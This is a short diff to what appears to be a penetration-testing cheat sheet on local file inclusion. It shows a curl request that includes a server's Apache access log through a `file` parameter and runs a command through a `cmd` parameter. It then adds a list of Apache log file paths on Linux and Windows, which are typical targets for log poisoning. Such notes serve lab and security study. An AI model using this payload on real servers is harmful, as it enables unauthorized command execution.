@@ -16,3 +16,17 @@ Vulnerable parameter `?file=` and  `&cmd`
 ```bash
 curl "http://$poor_web_server/menu.php?file=c:\xampp\apache\logs\access.log&cmd=dir"
 ```
+
+
+## Log File Locations:
+
+Linux
+```bash
+/var/log/apache/access.log
+/var/log/apache2/access.log
+/var/log/httpd/access.log
+```
+Windows
+```
+C:\xampp\apache\logs\access.log
+```
